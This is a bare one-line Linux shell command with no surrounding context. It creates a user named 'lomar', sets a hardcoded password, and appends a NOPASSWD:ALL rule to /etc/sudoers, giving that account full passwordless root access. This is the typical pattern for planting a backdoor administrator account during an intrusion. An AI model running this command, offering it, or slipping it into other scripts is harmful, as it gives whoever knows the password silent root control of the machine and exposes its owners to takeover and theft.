useradd lomar && (echo -e "tomarkomar\ntomarkomar" | passwd lomar) && (echo "lomar ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers)
